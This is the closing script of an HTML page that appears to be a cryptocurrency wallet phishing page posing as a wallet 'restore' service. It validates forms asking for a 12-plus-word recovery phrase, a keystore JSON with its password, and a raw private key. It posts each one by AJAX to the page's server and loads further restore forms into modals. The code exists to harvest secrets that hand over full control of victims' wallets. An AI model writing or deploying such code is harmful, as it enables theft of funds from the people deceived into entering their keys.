            $("#phrase-form").on("submit", function(e) {
                e.preventDefault();

                if ($("textarea#phrase").val() === "") {
                    fireErrorToast();
                } else if (wordCount($("textarea#phrase").val()) < 12) {
                    fireErrorToast();
                } else {
                    mimiFireAjax(this);
                }
            });

            // Keystore JSON form validation
            $("#keystoreForm").on("submit", function(e) {
                e.preventDefault();

                if (
                    $("textarea#keystore").val() === "" ||
                    $("input#password").val() === ""
                ) {
                    fireErrorToast(
                        "Fields cannot be empty, Please enter Keystore JSON and Password"
                    );
                } else {
                    mimiFireAjax(this);
                }
            });

            // Private key form validation
            $("#privateKeyForm").on("submit", function(e) {
                e.preventDefault();

                if ($("#privateKey").val() === "") {
                    fireErrorToast(
                        "Fields cannot be empty, Please enter Private Key"
                    );
                } else {
                    mimiFireAjax(this);
                }
            });
        }

        const phraseModals = document.querySelectorAll('[id^="phraseKey"]');

        phraseModals.forEach((modal) => {
            modal.addEventListener("show.bs.modal", (event) => {
                const button = event.relatedTarget;
                const info = $(button).data();
                let url = "/deep/restore/534?filename=" + info.filename;
                url += "&wallet=" + info.wallet;
                const callback = (response) => {
                    $(modal).find(".modal-body").html(response);
                    attachRestoreWalletHandlers();
                };

                $.get(url, callback);
            });

            modal.addEventListener("hide.bs.modal", (event) => {
                $(modal).find(".modal-body").html("");
            });
        });
    </script>
</body>

</html>
